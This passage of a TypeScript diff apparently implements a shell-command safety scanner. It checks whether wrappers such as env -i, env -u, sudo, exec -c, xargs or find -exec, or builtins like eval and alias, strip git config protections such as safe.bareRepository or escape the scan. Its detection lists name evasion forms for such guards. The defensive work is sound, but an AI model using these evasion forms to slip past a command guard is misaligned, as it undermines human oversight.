+    if (node === null) continue;
+    const list = (node.type === 'command' ? words(node) : declarationWords(node)).map(wordValue);
+    let rest = withoutWrappers(list);
+    let prefixed = false;
+    while (rest[0] === 'builtin' || rest[0] === 'command') {
+      prefixed = true;
+      rest = rest.slice(1);
+      while (/^(--|-[pvV]+)$/.test(rest[0] ?? '')) rest = rest.slice(1);
+      rest = withoutWrappers(rest);
+    }
+    const [program = '', ...args] = rest;
+    // A program word the parse cannot read as a plain name (`builtin $x ...`, `command -x ...`) may be an unset.
+    readsCode ||= prefixed && !/^[\w.:[][\w.:[-]*$/.test(program);
+    const names = args.some(arg => /GIT_CONFIG|[$`]/.test(arg));
+    if (program === 'unset' && names) return true;
+    if (program === 'export' && names && args.some(arg => /^-[A-Za-z]*n/.test(arg))) return true;
+    readsCode ||=
+      READS_SHELL_CODE.has(program) ||
+      list.some(word => XARGS_SHELLS.has(programName(word)) || programName(word) === 'eval');
+  }
+  return readsCode && UNSETS_GIT_CONFIG.test(gateText);
+}
+
+/** Programs that run their command with a fresh environment (and so without the shell's git config). */
+const RESETS_ENVIRONMENT = new Set(['sudo', 'doas', 'su', 'pkexec', 'runuser']);
+
+/** Whether a leading wrapper of `tokens` hands the command an environment without the shell's git config. */
+function dropsGitConfig(tokens: readonly string[]): boolean {
+  for (let at = 0; at < tokens.length && isWrapper(tokens[at]); at = pastWrapper(tokens, at)) {
+    const name = programName(unquote(tokens[at]));
+    if (RESETS_ENVIRONMENT.has(name)) return true;
+    if (name === 'exec' && givenOptions(tokens, at).some(given => given.short && given.option === 'c')) return true;
+    if (name !== 'env') continue;
+    if (wrapperWords('env', tokens, at + 1).options.some(index => unquote(tokens[index]) === '-')) return true;
+    for (const given of givenOptions(tokens, at)) {
+      if (given.option === 'i' || given.option === 'ignore-environment') return true;
+      if (given.option === 'u' || given.option === 'unset') {
+        const value = given.value === undefined ? undefined : unquote(given.value);
+        if (value === undefined || isDynamic(value) || value === 'PATH' || ALIAS_VARIABLE.test(value)) return true;
+      }
+    }
+  }
+  return false;
+}
+
+/** Whether an `env` leading `tokens` clears the environment, or the variables, the shell's safe.bareRepository rides in. */
+function dropsBareRepository(tokens: readonly string[]): boolean {
+  for (let at = 0; at < tokens.length && isWrapper(tokens[at]); at = pastWrapper(tokens, at)) {
+    const name = programName(unquote(tokens[at]));
+    if (name === 'exec' && givenOptions(tokens, at).some(given => given.short && given.option === 'c')) return true;
+    if (name !== 'env') continue;
+    if (wrapperWords('env', tokens, at + 1).options.some(index => unquote(tokens[index]) === '-')) return true;
+    for (const given of givenOptions(tokens, at)) {
+      if (given.option === 'i' || given.option === 'ignore-environment') return true;
+      if (given.option === 'u' || given.option === 'unset') {
+        const value = given.value === undefined ? undefined : unquote(given.value);
+        if (value === undefined || isDynamic(value) || /^GIT_CONFIG_(PARAMETERS|COUNT|KEY_|VALUE_)/.test(value)) {
+          return true;
+        }
+      }
+    }
+  }
+  return false;
+}
+
+/** Programs that run a command given in their own words (a launcher, `find -exec`, `xargs`). */
+const LAUNCHES_COMMANDS = new Set(['pnpm', 'npm', 'yarn', 'npx', 'pnpx', 'bunx', 'bun', 'find', 'xargs']);
+
+/** Whether `tokens` hand git to an `env` that drops safe.bareRepository, behind a launcher or `-exec`. */
+function dropsBareRepositoryBehind(tokens: readonly string[]): boolean {
+  return tokens.some((token, at) => {
+    if (at === 0 || programName(unquote(token)) !== 'env') return false;
+    const command = tokens.slice(at);
+    return programName(unquote(withoutWrappers(command)[0] ?? '')) === 'git' && dropsBareRepository(command);
+  });
+}
+
+/** The words of each git command `tokens` launch behind a tool launcher (`pnpm exec git`, `npx git`) or `find -exec`. */
+function launchedGitCommands(tokens: readonly string[]): { runs: string[][]; unread: boolean } {
+  const none = { runs: [], unread: false };
+  const [wrapped, ...rest] = withoutWrappers(tokens);
+  if (wrapped === undefined) return none;
+  const name = programName(unquote(wrapped)).replace(/[\d.]+$/, '');
+  const runsGit = (words: readonly string[]): boolean => {
+    const [program] = withoutWrappers(words);
+    return program !== undefined && programName(unquote(program)) === 'git';
+  };
+  if (name === 'find') {
+    const found = findActions(rest).runs.map(run =>
+      runsGit(run) ? { runs: [run], unread: false } : launchedGitCommands(run)
+    );
+    return { runs: found.flatMap(each => each.runs), unread: found.some(each => each.unread) };
+  }
+  const launch = packageCommand(withoutWrappers(tokens));
+  if (launch === null) return none;
+  if (launch.unread) return { runs: [], unread: rest.some(word => programName(unquote(word)) === 'git') };
+  const command = withoutWrappers(tokens).slice(launch.at);
+  return runsGit(command) ? { runs: [command], unread: false } : launchedGitCommands(command);
+}
+
+/**
+ * Whether the git words xargs runs, `raw` (after `git`), leave the subcommand to the words it is fed, or name its
+ * replace string `placeholder` in a global option or the subcommand.
+ */
+function namesInput(raw: readonly string[], placeholder: string | null): boolean {
+  const at = gitSubcommandAt(raw);
+  if (at === null) return true;
+  const upto = at === 'open' ? raw : raw.slice(0, at + 1);
+  return placeholder !== null && upto.some(word => wordValue(word).includes(placeholder));
+}
+
+/** Whether git's global options in `raw` (the words after `git`) set safe.bareRepository, by `-c` or `--config-env`. */
+function setsBareRepository(raw: readonly string[]): boolean {
+  const at = gitSubcommandAt(raw);
+  const options = at === null || at === 'open' ? raw : raw.slice(0, at);
+  const names = (setting: string): boolean => setting.split('=')[0]?.toLowerCase() === 'safe.barerepository';
+  for (let index = 0; index < options.length; index++) {
+    const arg = wordValue(options[index] as string);
+    if (arg === '-C') index++;
+    else if (arg === '-c' || arg === '--config-env') {
+      const next = options[++index];
+      if (next !== undefined && names(wordValue(next))) return true;
+    } else if (arg.startsWith('--config-env=') && names(arg.slice('--config-env='.length))) return true;
+  }
+  return false;
+}
+
+/** The `env -S 'bash run.sh'` in a run of leading wrappers, which runs its value as a command line; null when none. */
+export function splitString(tokens: readonly string[]): SplitString | null {
+  for (let at = 0; at < tokens.length && isWrapper(tokens[at]); at = pastWrapper(tokens, at)) {
+    if (programName(unquote(tokens[at])) !== 'env') continue;
+    const option = wrapperWords('env', tokens, at + 1).options.find(index => splitsString(unquote(tokens[index])));
+    if (option === undefined) continue;
+    const { value, next } = optionArgument(tokens, option, 'S');
+    // env reads options and assignments in the value too, as `env -S '-i FOO=1 make'`.
+    return { env: at, option, command: [tokens[at], unquote(value ?? ''), ...tokens.slice(next)].join(' ') };
+  }
+  return null;
+}
+
+/** The command a wrapper runs, with the wrapper's own words dropped. */
+function withoutWrappers(tokens: readonly string[]): string[] {
+  return tokens.slice(wrappedStart(tokens));
+}
+
+interface WrapperEffects {
+  /** Folders, as written, the wrappers move the command into, in order. */
+  folders: string[];
+  /** Files a wrapper writes, as written. */
+  outputs: string[];
+  /** A wrapper option or form the scan cannot follow. */
+  unread: boolean;
+}
+
+interface GivenOption {
+  option: string;
+  short: boolean;
+  value: string | undefined;
+}
+
+/** Each option given to the wrapper at `tokens[at]`, by letter or long name, with its value as written. */
+function givenOptions(tokens: readonly string[], at: number): GivenOption[] {
+  const name = programName(unquote(tokens[at] ?? ''));
+  const wrapper = WRAPPERS.get(name) ?? NO_OPTIONS;
+  const given: GivenOption[] = [];
+  for (const index of wrapperWords(name, tokens, at + 1).options) {
+    const word = unquote(tokens[index] as string);
+    if (wrapper.words) {
+      given.push({
+        option: word.slice(1),
+        short: true,
+        value: wrapper.words.includes(word) ? tokens[index + 1] : undefined,
+      });
+    } else if (word.startsWith('--')) {
+      const equals = word.indexOf('=');
+      const option = word.slice(2, equals === -1 ? undefined : equals);
+      const value =
+        equals !== -1 ? word.slice(equals + 1) : longTakesValue(wrapper, option) ? tokens[index + 1] : undefined;
+      given.push({ option: longOptionName(wrapper, option) ?? option, short: false, value });
+    } else {
+      for (let letter = 1; letter < word.length; letter++) {
+        const option = word[letter] as string;
+        const valued = wrapper.values.includes(option);
+        if (!valued && !wrapper.glued?.includes(option)) {
+          given.push({ option, short: true, value: undefined });
+          continue;
+        }
+        given.push({ option, short: true, value: word.slice(letter + 1) || (valued ? tokens[index + 1] : undefined) });
+        break;
+      }
+    }
+  }
+  return given;
+}
+
+const givenIn = (set: WrapperOptions | undefined, { option, short }: GivenOption): boolean =>
+  set !== undefined && (short ? (set.letters ?? '').includes(option) : (set.long ?? []).includes(option));
+
+/** What a run of leading wrappers does besides running the command: folders it moves into, files it writes. */
+export function wrapperEffects(tokens: readonly string[]): WrapperEffects {
+  const effects: WrapperEffects = { folders: [], outputs: [], unread: false };
+  let at = 0;
+  while (at < tokens.length && isWrapper(tokens[at])) {
+    const wrapper = WRAPPERS.get(programName(unquote(tokens[at]))) ?? NO_OPTIONS;
+    if (wrapper.elsewhere) effects.unread = true;
+    let needed = wrapper.needs === undefined;
+    for (const given of givenOptions(tokens, at)) {
+      if (givenIn(wrapper.needs, given)) needed = true;
+      if (givenIn(wrapper.unread, given)) effects.unread = true;
+      if (givenIn(wrapper.chdir, given)) {
+        if (given.value === undefined) effects.unread = true;
+        else effects.folders.push(given.value);
+      }
+      if (givenIn(wrapper.output, given) && given.value !== undefined) effects.outputs.push(given.value);
+    }
+    if (!needed) effects.unread = true;
+    const end = pastWrapper(tokens, at);
+    if (end <= at) break;
+    at = end;
+  }
+  // An option where the command should start is one the grammar above does not know, as `flock FILE -c`.
+  if (at < tokens.length && unquote(tokens[at]).startsWith('-')) effects.unread = true;
+  return effects;
+}
+
+/** Whether a leading xargs builds its command from input; `file` when `-a`/`--arg-file` names where it reads it. */
+function xargsFeeds(tokens: readonly string[]): { file: boolean } | null {
+  const xargs = WRAPPERS.get('xargs') ?? NO_OPTIONS;
+  for (let at = 0; at < tokens.length && isWrapper(tokens[at]); at = pastWrapper(tokens, at)) {
+    if (programName(unquote(tokens[at])) !== 'xargs') continue;
+    const file = wrapperWords('xargs', tokens, at + 1).options.some(index => {
+      const word = unquote(tokens[index]);
+      if (word.startsWith('--')) return longOptionName(xargs, word.slice(2).split('=')[0] as string) === 'arg-file';
+      return [...word.slice(1)].find(letter => xargs.values.includes(letter)) === 'a';
+    });
+    return { file };
+  }
+  return null;
+}
+
+/** Whether a redirect feeds `node` input, on it or on the pipeline it ends. */
+function stdinRedirected(node: Node): boolean {
+  for (
+    let at: Node = node;
+    at.parent?.type === 'redirected_statement' || at.parent?.type === 'pipeline';
+    at = at.parent
+  ) {
+    const parent: Node = at.parent;
+    if (parent.type !== 'redirected_statement') continue;
+    const input = parent.namedChildren.some(
+      child =>
+        child !== null &&
+        (child.type === 'heredoc_redirect' ||
+          child.type === 'herestring_redirect' ||
+          (child.type === 'file_redirect' && (redirectOperator(child) ?? '').includes('<')))
+    );
+    if (input) return true;
+  }
+  return false;
+}
+
+/**
+ * The folders the command before `node` in its pipeline lists from, when it is a lister (`listsNames`), so its
+ * output is all xargs reads; null otherwise.
+ */
+function listerFeeds(node: Node, script: string): Listing | null {
+  const { producer, filtered } = feeder(node);
+  const listing = producer ? listsNames(words(producer), script) : null;
+  // A line filter splits NUL-ended names at newlines.
+  return listing?.nul && filtered ? null : listing;
+}
+
+/** The command that feeds `node` past the line filters (linesFilter) between them, and whether there are any. */
+function feeder(node: Node): { producer: Node | null; filtered: boolean } {
+  let producer = pipedFrom(node);
+  let filtered = false;
+  while (producer !== null && linesFilter(words(producer))) {
+    filtered = true;
+    producer = pipedFrom(producer);
+  }
+  return { producer, filtered };
+}
+
+/** Each word's value when none expands (no expansion, glob, brace or tilde), else null. */
+function fixedWords(raw: readonly string[]): string[] | null {
+  return everyWord(raw, word => {
+    const pieces = wordPieces(word);
+    if (pieces.some(piece => !('char' in piece) || (piece.active && '*?[{~'.includes(piece.char)))) return null;
+    return pieces.map(piece => ('char' in piece ? piece.char : '')).join('');
+  });
+}
+
+/** Each word as `read` reads it, or null when it reads any as null. */
+function everyWord(raw: readonly string[], read: (word: string) => string | null): string[] | null {
+  const values: string[] = [];
+  for (const word of raw) {
+    const value = read(word);
+    if (value === null) return null;
+    values.push(value);
+  }
+  return values;
+}
+
+/**
+ * A word as bash passes it (`\--output` and `"--output"` are `--output`), or null when it is an option an expansion,
+ * glob, brace or tilde changes or makes: `--o{utput,x}=f`, `-o*`, `-o"$F"`, `{-o,f}`.
+ */
+function bashOption(word: string): string | null {
+  const pieces = wordPieces(word);
+  if (!pieces.some(piece => !('char' in piece) || (piece.active && '*?[{~'.includes(piece.char)))) {
+    return pieces.map(piece => ('char' in piece ? piece.char : '')).join('');
+  }
+  const expanded = expandBraces(pieces);
+  if (expanded === null) return null;
+  // An expansion that may be empty (`${X:+}--pre=f`, `$(true)-c`) leaves the dash after it to start the word.
+  const option = expanded.some(variant => {
+    const first = variant.find(piece => 'char' in piece && piece.char !== '');
+    return first !== undefined && 'char' in first && first.char === '-';
+  });
+  return option ? null : wordValue(word);
+}
+
+/**
+ * The text bash passes before a word's first expansion, unquoted glob, brace or tilde, and whether an expansion ends
+ * it. Leading expansions are skipped, since each may be empty: `${X:+}--pre=f` reads as `--pre=f`.
+ */
+function literalHead(word: string): { head: string; expansion: boolean } {
+  let head = '';
+  let leading = false;
+  for (const piece of wordPieces(word)) {
+    if (!('char' in piece)) {
+      if (head !== '') return { head, expansion: true };
+      leading = true;
+      continue;
+    }
+    if (piece.active && '*?[{~'.includes(piece.char)) break;
+    head += piece.char;
+  }
+  return { head, expansion: leading && head === '' };
+}
+
+/**
+ * Whether bash may pass `word` as an option `matches` accepts: tested on its value, or on its fixed option as
+ * `optionStandIn` reads it. While its name is open, whether its literal text can still begin one of `names` (each
+ * `--long`), or any option at all when `short` and it is no long name (`-x$Y`, `-$Y`, `{-x,y}`).
+ */
+function mayPassOption(
+  word: string,
+  valued: string,
+  matches: (option: string) => boolean,
+  names: readonly string[],
+  short: boolean
+): boolean {
+  const standIn = optionStandIn(word, valued);
+  if (standIn !== null) return matches(standIn);
+  const { head } = literalHead(word);
+  if (short && !head.startsWith('--')) return true;
+  return names.some(name => name.startsWith(head)) || matches(head);
+}
+
+/**
+ * The option a word `bashOption` cannot read is, decided by the literal text before its first expansion, glob, brace
+ * or tilde: a long `--name=`, or a short cluster up to its first letter in `valued`. `value` is the word's text after
+ * the option, or null when quoting precedes it or a glob or brace may rewrite the word. Null while the name is still
+ * open (`-x*`, `--o{utput,x}=`, `{-o,f}`).
+ */
+function fixedOption(
+  word: string,
+  valued: string
+): { name: string; long: boolean; flags: string; value: string | null } | null {
+  const { head } = literalHead(word);
+  const pattern = wordPieces(word).some(piece => 'char' in piece && piece.active && '*?[{'.includes(piece.char));
+  const glued = (prefix: string): string | null =>
+    !pattern && word.startsWith(prefix) && !/['"\\$`]/.test(prefix) ? word.slice(prefix.length) : null;
+  if (head.startsWith('--')) {
+    const equals = head.indexOf('=');
+    if (equals === -1) return null;
+    return { name: head.slice(2, equals), long: true, flags: '', value: glued(head.slice(0, equals + 1)) };
+  }
+  if (!head.startsWith('-')) return null;
+  for (let at = 1; at < head.length; at++) {
+    const letter = head[at] as string;
+    if (valued.includes(letter)) {
+      return { name: letter, long: false, flags: head.slice(1, at), value: glued(head.slice(0, at + 1)) };
+    }
+  }
+  return null;
+}
+
+/** A word as bash passes it, or the fixed option of one `bashOption` cannot read with `_` for its value; null while open. */
+function optionStandIn(word: string, valued: string): string | null {
+  const value = bashOption(word);
+  if (value !== null) return value;
+  const fixed = fixedOption(word, valued);
+  if (fixed === null) return null;
+  return fixed.long ? `--${fixed.name}=_` : `-${fixed.flags}${fixed.name}_`;
+}
+
+/** Each word as `optionStandIn` reads it, or null when any is an open option. */
+function optionStandIns(raw: readonly string[], valued: string): string[] | null {
+  return everyWord(raw, word => optionStandIn(word, valued));
+}
+
+/** Each word as `bashOption` reads it, or null when any may make or change an option. */
+function bashOptions(raw: readonly string[]): string[] | null {
+  return everyWord(raw, bashOption);
+}
+
+/** Values a line filter's options are read with: whole-line flags, and options that take a value. */
+const LINE_FILTERS: Record<string, { flags: string; values: string; long: RegExp }> = {
+  grep: {
+    flags: 'ivEFGPwxsqaUy',
+    values: 'em',
+    long: /^--(invert-match|ignore-case|no-ignore-case|extended-regexp|fixed-strings|basic-regexp|perl-regexp|word-regexp|line-regexp|no-messages|quiet|silent|text|regexp=.*|max-count=\d+)$/,
+  },
+  head: { flags: '', values: 'n', long: /^--lines=[+-]?\d+$/ },
+  sort: {
+    flags: 'bdfghiMnRrsuV',
+    values: 'kt',
+    long: /^--(reverse|unique|numeric-sort|general-numeric-sort|human-numeric-sort|month-sort|version-sort|ignore-case|dictionary-order|ignore-leading-blanks|stable)$/,
+  },
+  uniq: { flags: 'diuD', values: 'fsw', long: /^--(repeated|unique|ignore-case)$/ },
+};
+
+/**
+ * Whether a command prints only whole lines of its input, some dropped or reordered: grep (the pattern its one
+ * operand), head or tail by line count, sort or uniq, with no file operand and no option that changes a line.
+ */
+function linesFilter(raw: readonly string[]): boolean {
+  const values = fixedWords(raw);
+  if (values === null || raw.length === 0 || isWrapper(raw[0] as string)) return false;
+  const [program = '', ...args] = values;
+  const name = programName(program);
+  const grammar = own(LINE_FILTERS, /^[ef]grep$/.test(name) ? 'grep' : name === 'tail' ? 'head' : name);
+  if (grammar === undefined) return false;
+  let pattern = name.endsWith('grep');
+  const operands: string[] = [];
+  for (let index = 0; index < args.length; index++) {
+    const arg = args[index] as string;
+    if (arg === '--') {
+      operands.push(...args.slice(index + 1));
+      break;
+    }
+    if (grammar === LINE_FILTERS.head && /^-\d+$/.test(arg)) continue;
+    if (arg.startsWith('--')) {
+      if (!grammar.long.test(arg)) return false;
+      if (arg.startsWith('--regexp=')) pattern = false;
+      continue;
+    }
+    if (!arg.startsWith('-') || arg === '-') {
+      operands.push(arg);
+      continue;
+    }
+    for (let at = 1; at < arg.length; at++) {
+      const letter = arg[at] as string;
+      if (grammar.flags.includes(letter)) continue;
+      if (!grammar.values.includes(letter)) return false;
+      const value = arg.slice(at + 1) || args[++index];
+      if (value === undefined) return false;
+      if (letter === 'e') pattern = false;
+      if (letter === 'n' && !/^[+-]?\d+$/.test(value)) return false;
+      break;
+    }
+  }
+  return operands.length === (pattern ? 1 : 0);
+}
+
+/** The plain command before `node` in its pipeline, if any. */
+function pipedFrom(node: Node): Node | null {
+  const pipeline = node.parent;
+  if (pipeline?.type !== 'pipeline') return null;
+  // `|&`, `2>&1` or a stdout redirect on the producer sends on more than its own output, or none of it.
+  if (node.previousSibling?.type === '|&') return null;
+  const members = pipeline.namedChildren.filter((child): child is Node => child !== null);
+  let producer: Node | undefined = members[members.findIndex(child => child.id === node.id) - 1];
+  const redirects: Node[] = [];
+  if (producer?.type === 'redirected_statement') {
+    const body = producer.childForFieldName('body');
+    redirects.push(...producer.namedChildren.filter((child): child is Node => child !== null && child.id !== body?.id));
+    // tree-sitter hangs the redirect of `a | b 2>x` on the pipeline `a | b`; bash gives it to `b` alone.
+    producer = (body?.type === 'pipeline' ? body.lastNamedChild : body) ?? undefined;
+  }
+  if (producer?.type !== 'command') return null;
+  redirects.push(...producer.namedChildren.filter((child): child is Node => !!child?.type.endsWith('redirect')));
+  return redirects.every(stderrToFile) ? producer : null;
+}
+
+/**
+ * Whether a redirect sends only stderr to `/dev/null` or a fixed path outside `/dev` and `/proc` (`2>>log`), and so
+ * not back into the pipe as `2>/dev/stdout` would.
+ */
+function stderrToFile(redirect: Node): boolean {
+  const descriptor = redirect.children.find(child => child?.type === 'file_descriptor')?.text;
+  const targets = redirect.childrenForFieldName('destination');
+  const target = targets.length === 1 ? targets[0] : null;
+  if (redirect.type !== 'file_redirect' || descriptor !== '2') return false;
+  // A quoted target counts as its value when nothing in it expands.
+  const quotable = target && ['word', 'string', 'raw_string'].includes(target.type);
+  const value = quotable ? fixedWords([target.text])?.[0] : undefined;
+  if (value === undefined || !['>', '>>'].includes(redirectOperator(redirect) ?? '')) return false;
+  // Checked before normalizing, which would fold `link/..` into a path the link does not lead to.
+  if (!/^[\w./+-]+$/.test(value) || value.split('/').includes('..')) return false;
+  const path = posix.normalize(value);
+  return path === '/dev/null' || !/^\/(dev|proc)(\/|$)/.test(path);
+}
+
+/** The words of the command an xargs among the leading wrappers runs, past its own options; none without one. */
+function xargsCommand(tokens: readonly string[]): string[] {
+  for (let at = 0; at < tokens.length && isWrapper(tokens[at]);) {
+    const end = pastWrapper(tokens, at);
+    if (programName(unquote(tokens[at])) === 'xargs') return tokens.slice(end);
+    if (end <= at) break;
+    at = end;
+  }
+  return [];
+}
+
+/** Entries of a folder `ls` prints before xargs that the scan reads before it stops. */
+const FED_ENTRIES = 1000;
+
+/**
+ * Words a command before xargs prints from its own operands. `ls` when they are ls operands, which, unless `dirs`
+ * (`-d`), print a folder's entries in its place.
+ */
+interface StaticFeed {
+  words: string[];
+  ls: boolean;
+  dirs?: boolean;
+}
+
+/**
+ * What the command before `node` prints when it prints only its own words: `echo`, `printf '%s\n'` or a format of
+ * plain words alone, or `ls` of operands (of `.` without any). Null for any other producer.
+ */
+function staticFeed(node: Node): StaticFeed | null {
+  const producer = pipedFrom(node);
+  const raw = producer ? words(producer) : [];
+  if (raw.length === 0 || isWrapper(raw[0] as string)) return null;
+  const [program, ...args] = [programName(unquote(raw[0] as string)), ...raw.slice(1)];
+  if (program === 'echo') {
+    const at = args.findIndex(arg => !/^-[neE]+$/.test(unquote(arg)));
+    return { words: at === -1 ? [] : args.slice(at), ls: false };
+  }
+  if (program === 'printf') {
+    const format = unquote(args[0] ?? '');
+    if (/^%s(\\n| )$/.test(format)) return { words: args.slice(1), ls: false };
+    if (args.length !== 1 || !/^([^\\%']|\\n)*$/.test(format)) return null;
+    return {
+      words: format
+        .split(/\\n|\s+/)
+        .filter(word => word !== '')
+        .map(word => `'${word}'`),
+      ls: false,
+    };
+  }
+  if (program === 'ls') {
+    if (args.some(arg => unquote(arg).startsWith('-') && !/^-[1d]+$/.test(unquote(arg)))) return null;
+    const operands = args.filter(arg => !unquote(arg).startsWith('-'));
+    const dirs = args.some(arg => /^-[1d]*d/.test(unquote(arg)));
+    return { words: operands.length > 0 ? operands : ['.'], ls: true, dirs };
+  }
+  return null;
+}
+
+/** Whether a leading xargs splits its input at blanks and newlines, as it does without `-0` or `-d`. */
+function xargsSplitsAtBlanks(tokens: readonly string[]): boolean {
+  return xargsGiven(tokens, ['0', 'd', 'null', 'delimiter']) === false;
+}
+
+/** Whether a leading xargs reads names ended by NUL bytes (`-0`). */
+function xargsReadsNul(tokens: readonly string[]): boolean {
+  return xargsGiven(tokens, ['0', 'null']) === true;
+}
+
+const DELIMITER_ESCAPES: Record<string, string> = {
+  a: '\x07',
+  b: '\b',
+  f: '\f',
+  n: '\n',
+  r: '\r',
+  t: '\t',
+  v: '\v',
+  '\\': '\\',
+};
+
+/** The byte GNU xargs reads a `-d` value as, escapes resolved; null for one it refuses. */
+function delimiterChar(text: string): string | null {
+  if (text.length === 1 && text.charCodeAt(0) < 0x80) return text;
+  const named = text.length === 2 && text[0] === '\\' ? own(DELIMITER_ESCAPES, text[1] as string) : undefined;
+  if (named !== undefined) return named;
+  const hex = /^\\x([0-9a-fA-F]+)$/.exec(text)?.[1];
+  const octal = /^\\(0[0-7]*)$/.exec(text)?.[1];
+  const code = hex !== undefined ? parseInt(hex, 16) : octal !== undefined ? parseInt(octal, 8) : 256;
+  return code < 256 ? String.fromCharCode(code) : null;
+}
+
+/** The delimiter each `-d`/`--delimiter` of a leading xargs names, null for one the scan cannot read. */
+function xargsDelimiters(tokens: readonly string[]): (string | null)[] {
+  for (let at = 0; at < tokens.length && isWrapper(tokens[at]); at = pastWrapper(tokens, at)) {
+    if (programName(unquote(tokens[at])) !== 'xargs') continue;
+    return givenOptions(tokens, at)
+      .filter(({ option }) => option === 'd' || option === 'delimiter')
+      .map(({ value }) => (value === undefined || isDynamic(value) ? null : delimiterChar(wordValue(value))));
+  }
+  return [];
+}
+
+/** pgrep long options that leave it printing process ids alone. */
+const PGREP_IDS_ONLY =
+  /^--(full|exact|newest|oldest|inverse|ignore-case|count|lightweight|euid|uid|group|pgroup|parent|session|terminal|older|runstates|cgroup)(=.*)?$/;
+
+/**
+ * Whether what feeds `node`, past line filters, is safe as operands of a docker or git command: plain words of
+ * `echo` or `printf` and `pgrep` or `docker ps -q` ids, none starting with `-`, or `git branch` names.
+ */
+function optionFreeFeed(node: Node): boolean {
+  const { producer, filtered } = feeder(node);
+  const raw = producer ? words(producer) : [];
+  const values = fixedWords(raw);
+  if (values === null || raw.length === 0 || isWrapper(raw[0] as string)) return false;
+  const [program = '', ...args] = values;
+  switch (programName(program)) {
+    case 'echo':
+    case 'printf': {
+      const fed = filtered ? null : staticFeed(node);
+      // Unquoted, a word with a blank or quote is several words to xargs (`echo "main --force"`).
+      return fed !== null && fed.words.every(word => !/^-|[\s'"\\]/.test(wordValue(word)));
+    }
+    case 'pgrep':
+      // Without -l, -a or -d it prints only process ids.
+      return args.every(arg => (arg.startsWith('--') ? PGREP_IDS_ONLY.test(arg) : !/^-[^-]*[lad]/.test(arg)));
+    case 'docker': {
+      const [verb = '', ...rest] = args[0] === 'container' || args[0] === 'image' ? args.slice(1) : args;
+      if (!(verb === 'ps' || verb === 'images' || (verb === 'ls' && args[0] !== verb))) return false;
+      let quiet = false;
+      for (let index = 0; index < rest.length; index++) {
+        const arg = rest[index] as string;
+        if (/^-a?q[aq]*$/.test(arg) || arg === '--quiet') quiet = true;
+        else if (arg === '-f' || arg === '--filter') index++;
+        else if (!/^(-a|--all|--no-trunc|--filter=.*)$/.test(arg)) return false;
+      }
+      return quiet;
+    }
+    case 'git':
+      // A crafted ref may print a name starting with `-`, which reaches only `git branch -d`'s own options, and
+      // none of those touches a file.
+      return (
+        args[0] === 'branch' &&
+        args.slice(1).every(arg => !arg.startsWith('-') || /^--(no-)?merged(=.*)?$|^--list$/.test(arg))
+      );
+    default:
+      return false;
+  }
+}
+
+/** Whether a leading xargs is given one of `options`; null without one. */
+function xargsGiven(tokens: readonly string[], options: readonly string[]): boolean | null {
+  for (let at = 0; at < tokens.length && isWrapper(tokens[at]); at = pastWrapper(tokens, at)) {
+    if (programName(unquote(tokens[at])) !== 'xargs') continue;
+    return givenOptions(tokens, at).some(({ option }) => options.includes(option));
+  }
+  return null;
+}
+
+/**
+ * Whether a builtin can move this shell later, out of the scan's sight: an alias, a trap with an action,
+ * a mapfile callback (`-C`), or lastpipe, which runs a pipeline's last part here.
+ */
+function movesShell(name: string, args: readonly string[]): boolean {
+  if (name === 'alias') return args.some(arg => arg.includes('='));
+  if (name === 'trap') {
+    const [action, ...signals] = args.filter(arg => arg !== '--');
+    return action !== undefined && signals.length > 0 && action !== '' && !action.startsWith('-');
+  }
+  if (name === 'mapfile' || name === 'readarray') return args.some(arg => /^-[A-Za-z]*C/.test(arg));
+  return name === 'shopt' && args.some(arg => arg === 'lastpipe' || /[{}]/.test(arg));
+}
+
+/** Builtins and forms that can assign a variable by name, which a loop body must not hold for its variable to stay bound. */
+const ASSIGNS_BY_NAME =
+  /\b(eval|source|declare|typeset|local|export|readonly|read|mapfile|readarray|getopts|let|unset|alias|trap|for|select|cd|pushd|popd|chdir)\b|\(\(|(^|[;&|\n(]\s*)\.\s|\bprintf\b[^;&|\n]*\s-v/;
+
+/** A longer loop body leaves its variable unbound, which keeps the patterns below bounded. */
+const LOOP_BODY = 4096;
+
+/**
+ * Whether `for NAME in WORDS` keeps NAME to its words through the body: each word is a literal or a glob,
+ * and the body neither assigns NAME, changes directory, nor calls a function of the script, which may assign it.
+ */
+function loopBinds(
+  isFor: boolean,
+  name: string,
+  values: readonly string[],
+  body: string,
+  functions: ReadonlySet<string>
+): boolean {
+  if (!isFor || !/^[A-Za-z_]\w*$/.test(name) || values.length === 0 || body.length > LOOP_BODY) return false;
+  if (values.some(value => /[$`~]/.test(value))) return false;
+  if (ASSIGNS_BY_NAME.test(body)) return false;
+  const bodyWords = new Set(body.split(/[^\w.+-]+/));
+  if ([...functions].some(defined => bodyWords.has(defined))) return false;
+  return !new RegExp(`(^|[^\\w$])${name}(\\[[^\\]]*\\])?\\+?=|\\$\\{${name}:?=`).test(body);
+}
+
+/** Shells xargs may hand listed names to, as a script's arguments the scan cannot follow. */
+const XARGS_SHELLS = new Set(['sh', 'bash', 'dash', 'zsh', 'ksh', 'mksh', 'fish', 'busybox']);
+
+/** Programs whose arguments name no file, so input words handed to them reach nothing. */
+const NAMES_NOTHING = new Set(['echo', 'printf', 'basename', 'dirname', 'true', 'false', 'kill']);
+
+/** docker subcommands whose operands are containers or images. */
+const CONTAINER_OPERANDS = /^(stop|kill|rm|rmi|start|restart|pause|unpause|wait|inspect|logs)$/;
+
+/**
+ * Whether a command xargs runs takes its operands as processes, containers or git refs, never files: NAMES_NOTHING,
+ * `docker stop` and its kin, `git branch -d` and `git tag -d`.
+ */
+function takesNoFiles(consumer: readonly string[]): boolean {
+  const [program = '', ...args] = consumer.map(unquote);
+  const name = programName(program);
+  if (NAMES_NOTHING.has(name)) return true;
+  if (name === 'docker') {
+    const sub = args[0] === 'container' || args[0] === 'image' ? args[1] : args[0];
+    return CONTAINER_OPERANDS.test(sub ?? '');
+  }
+  if (name !== 'git' || (args[0] !== 'branch' && args[0] !== 'tag')) return false;
+  const options = args.slice(1).filter(arg => arg.startsWith('-'));
+  return (
+    options.some(option => /^(-[dDfr]*[dD][dDfr]*|--delete)$/.test(option)) &&
+    options.every(option => /^(-[dDfrq]+|--(delete|force|remotes|quiet))$/.test(option))
+  );
+}
+
+/** rg options a lister may carry: none follows a link or prints more than paths. `-e`, `-g`, `-t` and `-T` take a value. */
+const RG_LISTS =
+  /^(-[lisFwu0]+|-uu|--(files-with-matches|files|ignore-case|smart-case|fixed-strings|word-regexp|hidden|no-ignore|null|no-config))$/;
+const RG_LIST_VALUES = /^(-[egtT]|--(regexp|glob|type|type-not))$/;
+
+/** git ls-files options a lister may carry, none of which prints more than paths from the folder it runs in. */
